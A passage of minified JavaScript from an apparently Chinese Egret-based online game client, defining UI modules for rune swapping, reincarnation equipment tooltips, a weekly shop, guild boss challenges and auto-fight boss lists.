o.GlobalConfig.LiantiSuitConfig)1==this.data?i.push({type:e.LIANTISUIT_TYPE_MIN,lv:o.GlobalConfig.LiantiSuitConfig[n].id,att:o.GlobalConfig.LiantiSuitConfig[n]["minAttrs"+s.ActorCC.jobId]}):2==this.data&&i.push({type:e.LIANTISUIT_TYPE_MAX,lv:o.GlobalConfig.LiantiSuitConfig[n].id,att:o.GlobalConfig.LiantiSuitConfig[n]["maxAttrs"+s.ActorCC.jobId]});this.listArr.replaceAll(i)}},e.LIANTISUIT_TYPE_MIN="min",e.LIANTISUIT_TYPE_MAX="max",e}(n.BaseItemRender);e.LianTiSuitItem=r,window.LianTiSuitItem=r,__reflect(r.prototype,"LianTiSuitItem",[]),window.LianTiSuitItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneComposeResultWin=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="RuneSynthesisresultSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.btnSure.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHandler,this);var i=t[0],n=t[1];i>0?this.currentState="success":this.currentState="fail",n&&(this.item.data=n,this.item.showNum(!1))},e.prototype.onClickHandler=function(t){win.close(this)},e}(n.BaseView);e.RuneComposeResultWin=o,window.RuneComposeResultWin=o,__reflect(o.prototype,"RuneComposeResultWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneDecomposeItemData=void 0;var n=function(){function t(){this.itemData=null,this.isSelected=!1}return t}();e.RuneDecomposeItemData=n,window.RuneDecomposeItemData=n,__reflect(n.prototype,"RuneDecomposeItemData",[]),window.RuneDecomposeItemData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneReplaceWin=void 0;var n=i(1),o=i(6),s=i(40),a=i(10),r=i(108),l=i(150),h=i(127),u=i(1156),p=i(39),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RuneEquipChangeSkin",e.posIndex=0,e.roleIndex=0,e.item=null,e}return __extends(e,t),e.prototype.skinComplete=function(){this.myItem.isCur=!0,this.list.dataProvider=this.arc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.posIndex=isNaN(t[0])?0:t[0],this.roleIndex=isNaN(t[1])?0:t[1],this.item=t[2],l.RuneDataMgr.ins().posIsWear=this.item,this.myItem.data=new u.RuneReplaceItemData(this.item),this.updateList()},e.prototype.updateList=function(){var t=o.BagCT.ins().getBagGoodsByType(p.ItemType.TYPE_6);if(t){for(var e=[],i=[],n=this.item.itemConfig?a.ItemUtil.getSubType(this.item.itemConfig):-1,r=0,l=t;r<l.length;r++){var d=l[r];n>-1&&this.item.configID==d.configID||(h.RuneCC.isHas(d)&&n!=a.ItemUtil.getSubType(d.itemConfig)?i.push(d):e.push(d))}e.sort(this.sortRunes),i.sort(this.sortRunes);var c=[].concat(e,i),f=new s.ItemData;c.push(f);for(var g=[],m=0;m<c.length;m++){var v=new u.RuneReplaceItemData(c[m]);v.canEquip=!!~e.indexOf(c[m]),v.roleID=this.roleIndex,v.pos=this.posIndex,g.push(v)}this.arc.replaceAll(g)}},e.prototype.sortRunes=function(t,e){var i=a.ItemUtil.getQuality2(t.itemConfig),n=a.ItemUtil.getQuality2(e.itemConfig);if(i>n)return-1;if(n>i)return 1;var o=r.RuneConfigMgr.ins().getBaseCfg(t),s=r.RuneConfigMgr.ins().getBaseCfg(e);if(o&&s){var l=o.id%100,h=s.id%100;if(l>h)return-1;if(h>l)return 1}return t.configID-e.configID},e}(n.BaseView);e.RuneReplaceWin=d,window.RuneReplaceWin=d,__reflect(d.prototype,"RuneReplaceWin",[]),window.RuneReplaceWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SamsaraEquipTips=void 0;var n=i(1),o=i(48),s=i(13),a=i(16),r=i(0),l=i(40),h=i(10),u=i(62),p=i(353),d=i(24),c=i(26),f=i(34),g=i(18),m=i(5),v=function(t){function e(){var e=t.call(this)||this;return e.showXueYin=!1,e._sn_="ReincarnateEquipTipsSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(void 0!=t[1]){this.roleIndex=-1,this.roleModel=t[1],this.index=t[2];var i=t[0],n=!1;if(i>=0&&i<=s.SubRoles.ins().subRolesLen-1){var o=s.SubRoles.ins().getSubRoleByIndex(i);o.handle==this.roleModel.handle&&(n=!0,this.roleIndex=this.roleModel.index,this.showXueYin=!1)}var r=this.roleModel.getEquipByIndex(this.index),l=t[3]||!1,h=t[4]||!1;this.setData(r,l),n&&!h?(this.addTouchEvent(this.spiritBtn,this.addSpirit),this.addTouchEvent(this.soulBtn,this.addSoul),this.spiritBtn.visible=!0,this.soulBtn.visible=!0):(this.redPoint.visible=!1,this.redPoint1.visible=!1,this.spiritBtn.visible=!1,this.soulBtn.visible=!1)}else this.setTips(t[0]);this.showXueYin||a.DisplayUtils.removeFromParent(this.eXueyinBtn),this.addTouchEvent(this.bgClose,this.closeWin),this.addTouchEvent(this.eXueyinBtn,this.onXueyinBtn),this.updateBloodstain(),this.updateRed(),this.eScroller.height>590&&(this.eScroller.height=590)},e.prototype.setTips=function(t){this.spiritBtn.visible=!1,this.soulBtn.visible=!1,this.redPoint.visible=!1,this.redPoint1.visible=!1;var e=r.GlobalConfig.ItemConfig[t];this.updateBaseView(e);var i=new l.ItemData;i.itemConfig=e;var n=h.ItemUtil.calculateBagItemScore(i);this.powerPanel.setPower(n),this.score.text=gettext("评分：{0}",n);var o,s=h.ItemUtil.getSubType(e);s==u.EquipPos.HAT?(this.currentState="noSpirit0",o=!0):(o=!1,this.currentState="noSpirit1"),this.updateBaseAttr(t,o),this.setSoulAttr(0),this.setSoulLink(0,0);var a=[0,0,0,0];switch(s){case u.EquipPos.HAT:a[0]=1;break;case u.EquipPos.VIZARD:a[1]=1;break;case u.EquipPos.CLOAK:a[2]=1;break;case u.EquipPos.SHIELD:a[3]=1}this.setSuitAttr(e.id,a)},e.prototype.setData=function(t,e){this.soulBtn.visible=!0,this.spiritBtn.visible=!0,this.redPoint.visible=this.roleIndex>=0&&p.SamsaraModel.ins().checkEquipPosCanAddSpirit(this.roleModel,this.index),this.redPoint1.visible=this.roleIndex>=0&&p.SamsaraModel.ins().checkUpgradeSoul(this.roleModel,this.index);var i=t.item.itemConfig;this.currentItem=i;var n=t.soulLv;e&&(n+=1),this.updateBaseView(i,n);var o,s=r.GlobalConfig.EquipConfig[i.id],a=t.spiritLv;if(0==a&&0==t.spiritExp)this.index==u.EquipPos.HAT?(this.currentState="noSpirit0",o=!0):(this.currentState="noSpirit1",o=!1);else{var l=a==d.CommonUtils.getObjectLength(r.GlobalConfig.ReincarnateSpirit[this.index]);this.index==u.EquipPos.HAT?(this.currentState="doSpirit0",o=!0):(this.currentState="doSpirit1",o=!1),this.setSpirit(t.spiritExp,t.spiritLv,l,o)}this.updateBaseAttr(i.id,o);var c=p.SamsaraModel.ins().lowSuitEquips(this.index,this.roleModel);this.setSuitAttr(i.id,c),this.score.text=gettext("评分：{0}",t.item.point);for(var f=0,g=0;g<c.length;g++)c[g]&&f++;var m=4==f,v=p.SamsaraModel.ins().getReincarnateSuit(i.id),y=t.item.point;if(y=this.setSoulAttr(n,i.id,y),y=this.setSoulLink(n,p.SamsaraModel.ins().getSoulLinkLv(this.roleModel,this.index,n),i.id,y),this.roleModel&&s&&s.baseAttr2){var C=s.baseAttr2.value/100;y+=p.SamsaraModel.ins().getExtraPower(this.roleModel,C,s.baseAttr2.type)}if(m&&(y+=h.ItemUtil.getAttrPower(v.attrs)),a>0){var T=d.CommonUtils.getObjectByUnionAttr(r.GlobalConfig.ReincarnateSpirit,this.index,a);y+=h.ItemUtil.getAttrPower(T.attrs)}y>>=0,this.powerPanel.setPower(y)},e.prototype.updateBaseView=function(t,e){void 0===e&&(e=0);var i=h.ItemUtil.getQuality2(t),n=h.ItemUtil.getSubType(t),s=h.ItemUtil.getJob(t);if(this.nameLabel.text=t.name,e>0){var a="热血";switch(e){case 1:a+="Ⅰ";break;case 2:a+="Ⅱ";break;case 3:a+="Ⅲ";break;case 4:a+="Ⅳ"}this.nameLabel.text=a+"."+t.name,this.itemIcon.setTag("rein_soul_tag")}this.nameLabel.textColor=h.ItemUtil.getQualityColor(i),this.quali.source=i>0?"quali"+i:"",this.itemIcon.setData(t),this.type.text=o.Role.getEquipNameByType(n),this.lv.text=gettext("{0}转",t.zsLevel),this.lv.textColor=c.ZsCT.ins().lv<t.zsLevel?15937822:3532333,this.career.text=o.Role.getJobNameByJob(s)},e.prototype.updateBaseAttr=function(t,e){var i=r.GlobalConfig.EquipConfig[t];this.attr0.text=i.atk.toString(),this.attr1.text=i.hp.toString(),this.attr2.text=i.def.toString(),this.attr3.text=i.res.toString(),this.attr4.text=i.baseAttr1.value.toString(),e&&(this.attr5.text=i.baseAttr2.value/100+"%")},e.prototype.setSuitAttr=function(t,e){var i=p.SamsaraModel.ins().getEquipSamsaraLv(t),n=p.SamsaraModel.ins().getSamsaraDesc(i-7),s=p.SamsaraModel.ins().getReincarnateSuit(t);this.suitName.text=gettext("{0}套装",n),this.attr12.text=this.getValue(s.attrs,f.AttributeType.atAttack),this.attr13.text=this.getValue(s.attrs,f.AttributeType.atMaxHp),this.attr14.text=this.getValue(s.attrs,f.AttributeType.atDef),this.attr15.text=this.getValue(s.attrs,f.AttributeType.atRes),this.attr16.text=s.exAttrs[0].value/100+"%";for(var a=e[0]?g.ColorUtil.GREEN_COLOR:"0xff0000",r=e[1]?g.ColorUtil.GREEN_COLOR:"0xff0000",l=e[2]?g.ColorUtil.GREEN_COLOR:"0xff0000",h=e[3]?g.ColorUtil.GREEN_COLOR:"0xff0000",d=0,c=0;c<e.length;c++)e[c]&&d++;this.suitState.textFlow=m.TextFlowMaker.generateTextFlow("<font color="+a+">"+o.Role.getEquipNameByType(u.EquipPos.HAT)+"、</font><font color="+r+">"+o.Role.getEquipNameByType(u.EquipPos.VIZARD)+"、</font><font color="+l+">"+o.Role.getEquipNameByType(u.EquipPos.CLOAK)+"、</font><font color="+h+">"+o.Role.getEquipNameByType(u.EquipPos.SHIELD)+"</font>");var v=4==d,y=v?g.ColorUtil.GREEN_COLOR_N:16711680;this.suitNum.textColor=y,this.suitNum.text="("+d+"/4)",this.setSuitAttrTextColor(v)},e.prototype.setSuitAttrTextColor=function(t){var e=t?16711935:6710886;this.attr12.textColor=e,this.attr13.textColor=e,this.attr14.textColor=e,this.attr15.textColor=e,this.attr16.textColor=e,this.attrDesc.textColor=e,this.attrDesc1.textColor=e},e.prototype.setSpirit=function(t,e,i,n){var o,s=d.CommonUtils.getObjectByUnionAttr(r.GlobalConfig.ReincarnateSpirit,this.index,e);o=i?"":"("+t+"/"+s.consume+")",this.spiritLv.text="Lv"+e,this.spiritCost.text=o,0==e?(this.attr6.text="0",this.attr7.text="0",this.attr8.text="0",this.attr9.text="0"):(this.attr6.text=this.getValue(s.attrs,f.AttributeType.atAttack),this.attr7.text=this.getValue(s.attrs,f.AttributeType.atMaxHp),this.attr8.text=this.getValue(s.attrs,f.AttributeType.atDef),this.attr9.text=this.getValue(s.attrs,f.AttributeType.atRes))},e.prototype.getValue=function(t,e){var i=d.CommonUtils.getObjectByAttr(t,"type",e);return i.value.toString()},e.prototype.addSpirit=function(){this.closeWin(),win.open("AddSpiritView",this.roleIndex,this.index)},e.prototype.addSoul=function(){this.closeWin();var t=this.roleModel.getEquipByIndex(this.index);win.open("SamsaraSoulWin",this.roleIndex,this.index,this.nameLabel.text,this.getSoulEquipName(this.currentItem,t.soulLv+1),this.nameLabel.textColor,this.roleModel,this.index)},e.prototype.getSoulEquipName=function(t,e){var i=gettext("热血");if(e>0){switch(e){case 1:i+="Ⅰ";break;case 2:i+="Ⅱ";break;case 3:i+="Ⅲ";break;case 4:i+="Ⅳ"}i=i+"."+t.name}return i},e.prototype.setSoulAttr=function(t,e,i){if(void 0===e&&(e=0),void 0===i&&(i=0),0==t)this.soulDescLable.visible=!1,this.soulAddAttr0.text="",this.soulAddAttr1.text="",this.soulAddAttr2.text="",this.soulAddAttr3.text="",this.soulAddAttr4.text="";else{this.soulDescLable.visible=!0;var n=r.GlobalConfig.EquipConfig[e],o=n.atk,s=n.hp,a=n.def,l=n.res,u=n.baseAttr1.value,p=h.ItemUtil.getSubType(r.GlobalConfig.ItemConfig[e]),d=r.GlobalConfig.ReincarnationDemonLevel[p][t],c=d.precent/1e4;this.soulAddAttr0.text=Math.floor(o*c).toString(),this.soulAddAttr1.text=Math.floor(s*c).toString(),this.soulAddAttr2.text=Math.floor(a*c).toString(),this.soulAddAttr3.text=Math.floor(l*c).toString(),this.soulAddAttr4.text=Math.floor(u*c).toString();var f=0;if(n.baseAttr2&&(f=h.ItemUtil.getAttrPower([n.baseAttr2])),i=(i-f)*(1+c)+f,t>0){var g=r.GlobalConfig.ReincarnationSoulLevel[h.ItemUtil.getJob(r.GlobalConfig.ItemConfig[e])][p][t];i+=h.ItemUtil.getAttrPower(g.attrs)}i>>=0}return i},e.prototype.setSoulLink=function(t,e,i,n){void 0===i&&(i=0),void 0===n&&(n=0),0==t?(this.chainGroup.parent&&this.chainGroup.parent.removeChild(this.chainGroup),this.soulGroup.parent&&this.soulGroup.parent.removeChild(this.soulGroup)):(this.chainGroup.parent||this.suitGroup.parent.addChild(this.soulGroup),this.soulGroup.parent||this.suitGroup.parent.addChild(this.soulGroup)),this.soulLv.text="Lv"+t;var s=e;if(0==e&&(s=1),this.chainLv.text="Lv"+s,i){var a=h.ItemUtil.getSubType(r.GlobalConfig.ItemConfig[i]);if(s>0){var l=p.SamsaraModel.ins().getReincarnationLinkLevel(a,s);this.chainPos.text=gettext("[热血{0}]",o.Role.getEquipNameByType(l.secondSlot)),this.chainAttr.text=p.SamsaraModel.ins().getSoulLinkDesc(l.attrs[0].type),this.chainValue.text=l.attrs[0].value/100+"%";var u=void 0;if(u=0==e?6710886:16776960,this.chainPos.textColor=u,this.chainAttr.textColor=u,this.chainState.textColor=u,this.chainValue.textColor=u,e>0){var d=this.roleModel,c=h.ItemUtil.getAttrPower([l.attrs[0]])+h.ItemUtil.relatePower(l.attrs[0],d);n+=c}}if(t>0){var f=r.GlobalConfig.ReincarnationDemonLevel[a][t],g=void 0,m=f.precent/100;m+=100,g=m+"%",this.soulAttr.text=g}}return n},e.prototype.closeWin=function(){win.close(this)},e.prototype.onXueyinBtn=function(){win.open("BloodstainWin",h.ItemUtil.getSubType(this.currentItem),this.roleIndex),this.closeWin()},e.prototype.updateBloodstain=function(){return this.updateBloodGroup(),this.showXueYin&&this.currentItem?void 0:void a.DisplayUtils.removeFromParent(this.eXueyinGroup)},e.prototype.updateBloodGroup=function(){return this.showXueYin&&this.currentItem?void 0:void a.DisplayUtils.removeFromParent(this.eBloodGroup)},e.prototype.updateRed=function(){this.eXueyinBtn.eRp.visible=!1},e}(n.BaseView);e.SamsaraEquipTips=v,window.SamsaraEquipTips=v,__reflect(v.prototype,"SamsaraEquipTips",[]),window.SamsaraEquipTips=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WeekMarketMainPanel=void 0;var n=i(19),o=i(1),s=i(0),a=i(4),r=i(6),l=i(12),h=i(25),u=i(7),p=i(2),d=i(26),c=i(52),f=i(264),g=i(129),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WeekMarketMainSkin",e.evsIdx=0,e.openIdx=0,e.listDataDic={},e.listDataArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=f.WeekMarketItem,this.eList.dataProvider=this.list=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tabtype=Number(this.tab),this.addTouchEvent(this,this.onClick),this.eTab.addEventListener(egret.Event.CHANGE,this.updateList,this),observe(this,this.updateData,c.Shop.ins().postWeekLimitDatas,c.Shop.ins().postWeekLimitData),this.eList.selectedIndex=-1,this.evsIdx=0,this.updateData(),this.eTab.selectedIndex=this.evsIdx},e.prototype.updateData=function(){var t,e,i;this.listDataDic={},this.listDataArr=[],this.arr=[];var n=s.GlobalConfig.WeekLimitedStore;for(var o in n){var r=n[o];this.tabtype&&this.tabtype!=r.tabId1||r.openday>0&&u.GameServerCC.serverOpenDay+1<r.openday||r.mergeCount>0&&u.GameServerCC._hefuCount<r.mergeCount||r.job>0&&a.ActorCC.jobId!=r.job||r.openlevel>0&&a.ActorCC.level<r.openlevel||r.openzs>0&&d.ZsCT.ins().stage<r.openzs||(!r.openSystem||l.OpenSystem.ins().checkSysOpen(r.openSystem))&&(this.listDataDic[r.tabId2]||(this.listDataDic[r.tabId2]=[]),this.listDataDic[r.tabId2].push(n[o]))}if(0==Object.keys(this.listDataDic).length)return win.close(this),void this.parent.removeChild(this);for(var h in this.listDataDic){var p=this.listDataDic[h],c=null===(t=p[0])||void 0===t?void 0:t.shopName;this.listDataArr.push({key:h,name:c,tabId:null===(e=p[0])||void 0===e?void 0:e.tabId2}),void 0!=this.openIdx&&this.openIdx+1==(null===(i=p[0])||void 0===i?void 0:i.tabId2)&&(this.evsIdx=this.listDataArr.length-1)}this.eTab.dataProvider=new eui.ArrayCollection(this.listDataArr),this.eTab.selectedIndex=this.evsIdx,this.updateList()},e.prototype.updateList=function(){this.evsIdx=this.eTab.selectedIndex;var t=this.listDataArr[this.evsIdx];if(t){this.arr=this.listDataDic[t.tabId],this.list.source=this.arr;var e=this.arr[0].money,i=n.GlobalFun.getItemCount(e);this.money.setData({type:1,id:e,count:i})}},e.prototype.onClick=function(t){var e=this.arr[this.eList.selectedIndex];if(e&&"buy"==t.target.name){if(c.Shop.ins().getWeekNumById(e.index)>=e.Maxcount)return void p.TipsCT.ins().showTips(gettext("购买次数不足"));if(r.BagCT.ins().getAllSurplusCount(1)<=0)return void p.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));e.rid?h.Recharge.ins().sendPayOrder(e.rid):win.open(g.BuyItemPanel,e)}},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1)},e}(o.BaseView);e.WeekMarketMainPanel=m,window.WeekMarketMainPanel=m,__reflect(m.prototype,"WeekMarketMainPanel",[]),window.WeekMarketMainPanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixreincarnationsItem=void 0;var n=i(5),o=i(3),s=i(11),a=i(0),r=i(76),l=i(79),h=i(219),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layer=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.hideBG.visible=!1,this.addTouchEvent(this.goBtn,this.goSixPlace),this.addTouchEvent(this.btn_help,this.openHelp),this._rewardArr=new eui.ArrayCollection,this.lstReward0.itemRenderer=s.ItemBase,this.lstReward0.dataProvider=this._rewardArr,this.lstReward0.touchEnabled=!1},e.prototype.dataChanged=function(){if(this.data){this.names.source=this.data.fontName,this.desc0.text=gettext("达到{0}解锁",this.data.desc),this.desc0.visible=this.hideBG0.visible=this.hideBG.visible=!this.data.show,this._rewardArr.source=this.data.award,this._rewardArr.refresh(),this.layer=this.data.layer,this.icon.source=this.data.icon;var t=a.GlobalConfig.SixUndergroundPalacesLayerConfig[this.layer].size,e=t[0]*t[1],i=l.SixReisCT.ins().returnFindMapCountByLayer(this.layer)+"/"+e;this.finNum.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("已通关:{0}","|C:0x26A501&T:"+i)),this.btn_help.visible=1==this.layer?!0:!1}},e.prototype.goSixPlace=function(){l.SixReisCT.ins().sixLayer=this.layer,win.open(h.SixTeamRoomWin)},e.prototype.openHelp=function(){var t;win.open(r.CommonHelpWin,(null===(t=a.GlobalConfig.HelpInfoConfig[328])||void 0===t?void 0:t.text)||"")},e}(o.BaseItemRender);e.SixreincarnationsItem=u,window.SixreincarnationsItem=u,__reflect(u.prototype,"SixreincarnationsItem",[]),window.SixreincarnationsItem=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainMemberInfoWin=void 0;var n=i(1),o=i(248),s=i(250),a=i(44),r=i(83),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="memberInfoSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._dataVo=t[0],this.addTouchEvent(this,this.onTouch),observe(this,this.openOtherPlayerView,a.ReadPlayerCT.ins().postPlayerResult),this.update()},e.prototype.update=function(){this.imgHead.source="zjmhead_json.yuanhead"+this._dataVo.job+"1",this.labelName.text=this._dataVo.playerName,this.labelLv.text=(this._dataVo.zsLv?gettext("{0}级",this._dataVo.zsLv):"")+gettext("{0}级",this._dataVo.lv),this.btnRemove.visible=r.StardomainCT.ins().checkMeIsLeader(),this.btnRemove.visible?this.btnInfo.horizontalCenter=-63:this.btnInfo.horizontalCenter=0},e.prototype.onTouch=function(t){switch(t.target){case this.btnInfo:a.ReadPlayerCT.ins().sendFindPlayer(this._dataVo.roleId);break;case this.btnRemove:r.StardomainCT.ins().reqKickoutMember(this._dataVo.roleId),win.close(this)}},e.prototype.openOtherPlayerView=function(t){win.open(s.TeamFBCheckRoleWin,t)},e}(n.BaseView);e.StardomainMemberInfoWin=l,window.StardomainMemberInfoWin=l,__reflect(l.prototype,"StardomainMemberInfoWin",[]),window.MemberInfoWin=o.MemberInfoWin},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StoreHouseItem=void 0;var n=i(11),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="ItemCangKuSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.data&&(t.prototype.dataChanged.call(this),this.imgLock&&(this.imgLock.visible=this.data.storeHouselock),this.data.storeHouselock&&this.itemIcon.setIcon(""),this.data.handle||this.data.storeHouselock||this.itemIcon.setIcon(""))},e.prototype.onClick=function(t){},e.prototype.openItemTips=function(){this.showCurrency(),this.showDetail()},e}(n.ItemBase);e.StoreHouseItem=o,window.StoreHouseItem=o,__reflect(o.prototype,"StoreHouseItem",[]),window.StoreHouseItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomBossModel=void 0;var n=i(50),o=i(0),s=i(125),a=i(70),r=i(7),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.getCurBossIdByIndex=function(t){var e=o.GlobalConfig.DevilBossConfig[t].openBossList;for(var i in e)if(r.GameServerCC.serverOpenDay+1>=+i)return+e[i];return e[0]||e[1]},e.prototype.getCurFbIndex=function(){var t=s.DevildomSys.ins();if(t.historyId)return t.historyId-1;var e=[];for(var i in t.killedState)+i==t.bossId||t.killedState[i]||e.push(i);return e.length>0?e[a.MathUtils.limit(0,e.length)>>0]-1:a.MathUtils.limit(0,3)>>0},e}(n.BaseClass);e.DevildomBossModel=l,window.DevildomBossModel=l,__reflect(l.prototype,"DevildomBossModel",[]),window.DevildomBossModel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsChooseWin=void 0;var n=i(1),o=i(94),s=i(0),a=i(2),r=i(42),l=i(1207),h=i(1208),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildSoulsLandChooseSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.killbuffkeep.itemRenderer=l.GuildSoulsBuffItem,this.Monbuffkeep.itemRenderer=l.GuildSoulsBuffItem,this.buffkeep.itemRenderer=h.GuildSoulsBuffItem2,this.killbuffkeep.dataProvider=this.killBuffArc=new eui.ArrayCollection,this.Monbuffkeep.dataProvider=this.monBuffArc=new eui.ArrayCollection,this.buffkeep.dataProvider=this.keepBuffArc=new eui.ArrayCollection,observe(this,this.updateView,o.GuildSoulsLandCT.ins().postGetMonsterBuff),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.info=t[0],this.info&&(o.GuildSoulsLandCT.ins().sendGuildBuffs(),o.GuildSoulsLandCT.ins().sendGetMonsterBuff(this.info.type,this.info.index),this.updateView())},e.prototype.updateView=function(){if(this.info){this.mapname.text=gettext("第{0}层",r.StringUtils.NumberToChinese(this.info.cfg.id)),this.fbscene=this.info.scene;var t=s.GlobalConfig.MonstersConfig[this.info.monsterId];t&&(this.monpic.source="img"+(null===t||void 0===t?void 0:t.head)+"_png"),this.monname.text=s.GlobalConfig.MonstersConfig[this.info.monsterId].name,this.lbTimes.text=o.GuildSoulsLandCT.ins().challenge+"/"+o.GuildSoulsLandCT.MAX_CHALLENGE,this.start.visible=this.info.state,this.eInfo.visible=!this.info.state,this.updateBuff()}},e.prototype.updateBuff=function(){for(var t=o.GuildSoulsLandCT.ins().guildBuffArr,e=[],i=0,n=t;i<n.length;i++)for(var s=n[i],a=0;a<s.count;a++)e.push(s.buffId);this.keepBuffArc.replaceAll(e);var r=this.info.buffArr[1]?this.info.buffArr[1]:[];e=[];for(var l=0,h=r;l<h.length;l++)for(var s=h[l],a=0;a<s.buffNum;a++)e.push(s.buffId);this.killBuffArc.replaceAll(e),r=this.info.buffArr[2]?this.info.buffArr[2]:[],e=[];for(var u=0,p=r;u<p.length;u++)for(var s=p[u],a=0;a<s.buffNum;a++)e.push(s.buffId);this.monBuffArc.replaceAll(e)},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this);break;case this.start:if(o.GuildSoulsLandCT.ins().challenge<=0)return void a.TipsCT.ins().showTips(gettext("次数不足，明日恢复次数"));if(o.GuildSoulsLandCT.ins().cur<this.info.stage)return void a.TipsCT.ins().showTips(gettext("请先通关前面关卡"));o.GuildSoulsLandCT.ins().sendEnterSoulsLand(this.info.stage,this.info.type,this.info.index),win.close(this),win.close("GuildSkillWin"),win.close("GuildMap");break;case this.mark:o.GuildSoulsLandCT.ins().sendFocusMonster(this.info.type,this.info.index)}},e.prototype.removeDisplay=function(){!this.skin},e}(n.BaseView);e.GuildSoulsChooseWin=u,window.GuildSoulsChooseWin=u,__reflect(u.prototype,"GuildSoulsChooseWin",[]),window.GuildSoulsChooseWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoFightInfoItemRender=void 0;var n=i(5),o=i(3),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this
}return __extends(e,t),e.prototype.dataChanged=function(){this.info.textFlow=n.TextFlowMaker.generateTextFlow(this.data.str)},e}(o.BaseItemRender);e.AutoFightInfoItemRender=s,window.AutoFightInfoItemRender=s,__reflect(s.prototype,"AutoFightInfoItemRender",[]),window.AutoFightInfoItemRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoFightBossItemRender=void 0;var n=i(8),o=i(3),s=i(0),a=i(15),r=i(4),l=i(43),h=i(12),u=i(25),p=i(7),d=i(2),c=i(114),f=i(169),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.timer=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.check.addEventListener(eui.UIEvent.CHANGE,this.checkChange,this)},e.prototype.dataChanged=function(){var t,e,i;if(this.data.bossId?(i=s.GlobalConfig.MonstersConfig[this.data.bossId],this.bossName.text=(null===i||void 0===i?void 0:i.name)||""):this.bossName.text="--",this.check.selected=f.RexueDideCT.ins().isSeleced(this.data.bossId),this.state.text=i?gettext("复活"):"--",this.timer=(null===(t=l.CityCC.ins().mapBossList[this.data.bossId])||void 0===t?void 0:t.time)||0,this.timer||(this.timer=null===(e=c.KFBossSys.ins().kfBossAutoFightArr[this.data.bossId])||void 0===e?void 0:e.time),this.timer){if(!((n.DateUtils.formatMiniDateTime(this.timer)-p.GameServerCC.serverTime)/1e3<=0)){var o=(n.DateUtils.formatMiniDateTime(this.timer)-p.GameServerCC.serverTime)/1e3;this.state.text=n.DateUtils.getFormatBySecond(o,n.DateUtils.TIME_FORMAT_1)}Timer.start(1e3,0,this.timeFun,this)}var a=s.GlobalConfig.InstanceConfig[this.data.fbId];this.map.text=(null===a||void 0===a?void 0:a.name)||"",this.power.text=""+((null===a||void 0===a?void 0:a.powerlimit)||0),r.ActorCC.power<(null===a||void 0===a?void 0:a.powerlimit)?(this.check.enabled=!1,this.noPower.visible=!0):(this.check.enabled=!0,this.noPower.visible=!1)},e.prototype.timeFun=function(){var t=(n.DateUtils.formatMiniDateTime(this.timer)-p.GameServerCC.serverTime)/1e3;if(0>=t){var e=s.GlobalConfig.MonstersConfig[this.data.bossId];return this.state.text=e?gettext("复活"):"--",void Timer.stop(this.timeFun,this)}this.state.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_1)},e.prototype.checkChange=function(){if(!this.data.bossId)return void console.log("配置中找不到BossId");var t=l.CityCC.ins().mapBossList,e=c.KFBossSys.ins().kfBossAutoFightArr;t[this.data.bossId]?t=l.CityCC.ins().mapBossList:e[this.data.bossId]&&(t=e);var i=f.RexueDideCT.ins().autoTabSelectIndex,n=u.Recharge.ins().AutoPrivilegeTime;if(0==i){if(0==n)return d.TipsCT.ins().showTips(gettext("开通托管特权可激活")),void(this.check.selected=!1)}else{var o=h.OpenSystem.ins().checkSysOpen(a.SystemType.AUTO_FIGHT_BUY);if(!o){var r=s.GlobalConfig.OpenSystemConfig[a.SystemType.AUTO_FIGHT_BUY];return 